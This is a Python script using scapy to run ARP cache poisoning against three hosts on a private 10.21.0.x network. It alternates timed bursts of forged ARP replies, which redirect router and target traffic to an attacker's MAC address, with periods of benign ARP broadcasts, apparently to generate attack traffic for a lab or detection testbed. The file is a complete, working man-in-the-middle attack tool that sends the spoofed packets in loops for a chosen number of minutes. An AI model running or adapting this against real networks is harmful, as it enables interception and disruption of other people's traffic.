import subprocess
import random
import time
import signal
import sys
import os
from scapy.all import *
from datetime import datetime, timedelta

run_time_minutes = 60

INTERFACES = ['Melchior', 'Balthasar', 'Casper']
TARGET_INTERFACES = ['Maria', 'Rose', 'Sina']

# Data structure for agents
agents_info = {
    'Melchior': 'A6:85:95:1E:A3:1C',
    'Balthasar': '52:AC:C2:47:F9:B5',
    'Casper': '6A:76:E5:4C:3E:45'
}

# Data structure for targets
targets_info = {
    'Maria': {'target_ip':'10.21.0.16','target_mac':'CE:32:51:9F:81:02', 'router_mac': 'B2:C1:40:19:3A:F3'},
    'Rose':  {'target_ip':'10.21.0.17','target_mac':'12:45:6C:CD:58:D6', 'router_mac': '02:EB:3B:60:EC:58'}, 
    'Sina':  {'target_ip':'10.21.0.18','target_mac':'B2:DA:BF:0C:ED:AB', 'router_mac': '82:FB:46:AA:C6:E3'}
}

def create_benign_packets(target_mac, target_ip, router_mac):
    ## WHO IS Router? Tell Target
    benign_arp_router = Ether()/ARP()
    benign_arp_router[ARP].hwsrc = target_mac
    benign_arp_router[ARP].psrc = target_ip
    benign_arp_router[ARP].pdst = "10.21.0.5"
    benign_arp_router[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
    benign_arp_router[ARP].op = 1

    ## WHO IS Target? Tell Router
    benign_arp_target = Ether()/ARP()
    benign_arp_target[ARP].hwsrc = router_mac
    benign_arp_target[ARP].psrc = "10.21.0.5" 
    benign_arp_target[ARP].pdst = target_ip
    benign_arp_target[Ether].hwdst = "FF:FF:FF:FF:FF:FF"
    benign_arp_target[ARP].op = 1

    return benign_arp_router, benign_arp_target

def create_arp_poison_packets(attacker_mac, target_mac, target_ip, router_mac):
    ## Poison Router: Tell The Router Target --> US
    attacker_poison_router = Ether()/ARP()
    attacker_poison_router[ARP].hwsrc = attacker_mac
    attacker_poison_router[ARP].psrc = target_ip
    attacker_poison_router[ARP].pdst = "10.21.0.5" 
    attacker_poison_router[Ether].hwdst = router_mac
    attacker_poison_router[ARP].op = 2

    ## Poison Target: Tell Target Router --> US
    attacker_poison_target = Ether()/ARP()
    attacker_poison_target[ARP].hwsrc = attacker_mac
    attacker_poison_target[ARP].psrc = "10.21.0.5"
    attacker_poison_target[ARP].pdst = target_ip
    attacker_poison_target[Ether].hwdst = target_mac
    attacker_poison_target[ARP].op = 2

    return attacker_poison_router, attacker_poison_target

def run_program(run_time_minutes, attacker_interface, benign_arp_router, benign_arp_target, attacker_poison_router, attacker_poison_target):
    end_time_global = time.time() + run_time_minutes * 60
    print("Program stops at " + str(datetime.fromtimestamp(end_time_global)))

    #while loop the runs for the length of minutes of run_time_minutes
    while time.time() < end_time_global:
        duration = random.uniform(2, 5)
        end_time_attacker = datetime.now() + timedelta(minutes=duration)

        time.sleep(6)

        print("Arp Poisoning started at " + str(datetime.fromtimestamp(time.time())) + " for " + str(duration) + " minutes")
        while datetime.now() < end_time_attacker: #while loop that runs for the duration of the attack
            sendp(attacker_poison_router, iface=attacker_interface, verbose=0)
            sendp(attacker_poison_target, iface=attacker_interface, verbose=0)
            
            time.sleep(3)
        print("Arp Poisoning done")
        time.sleep(3)

        duration = random.uniform(2, 5)
        end_time_clean_benign = datetime.now() + timedelta(minutes=duration)

        print("Cleaned up / Benign Arp started at " + str(datetime.fromtimestamp(time.time())) + " for " + str(duration) + " minutes")
        while datetime.now() < end_time_clean_benign: #while loop that runs for the duration of clean up / benign arp
            sendp(benign_arp_router, iface=attacker_interface, verbose=0)
            sendp(benign_arp_target, iface=attacker_interface, verbose=0)
            time.sleep(3)
        print("Cleaned up / Benign Arp done")

    print("Program finished at " + str(datetime.fromtimestamp(time.time())))
    sendp(benign_arp_router, iface=attacker_interface, verbose=0)
    sendp(benign_arp_target, iface=attacker_interface, verbose=0)
    sys.exit(0)


def main():
    attacker_interface = None
    attacker_mac = None
    target_mac = None
    target_ip = None
    router_mac = None


    # Select which attacker to run
    print("select which attacker you want to run")
    print("1. Melchior")
    print("2. Balthasar")
    print("3. Casper")

    attacker_str = input("Enter your choice: ")
    attacker = int(attacker_str)
    run_time_minutes_str = input("Enter the time in minutes you want to run the attack for: ")
    run_time_minutes = float(run_time_minutes_str)

    if (attacker == 1):
        attacker_interface = 'Melchior'
        attacker_mac = agents_info['Melchior']
        target_mac = targets_info['Maria']['target_mac']
        target_ip = targets_info['Maria']['target_ip']
        router_mac = targets_info['Maria']['router_mac']
    elif (attacker == 2):
        attacker_interface = 'Balthasar'
        attacker_mac = agents_info['Balthasar']
        target_mac = targets_info['Rose']['target_mac']
        target_ip = targets_info['Rose']['target_ip']
        router_mac = targets_info['Rose']['router_mac']
    elif (attacker == 3):
        attacker_interface = 'Casper'
        attacker_mac = agents_info['Casper']
        target_mac = targets_info['Sina']['target_mac']
        target_ip = targets_info['Sina']['target_ip']
        router_mac = targets_info['Sina']['router_mac']

    benign_arp_router, benign_arp_target = create_benign_packets(target_mac, target_ip, router_mac)
    attacker_poison_router, attacker_poison_target = create_arp_poison_packets(attacker_mac, target_mac, target_ip, router_mac)
    run_program(run_time_minutes, attacker_interface, benign_arp_router, benign_arp_target, attacker_poison_router, attacker_poison_target)

# Entry point
if __name__ == "__main__":
    main()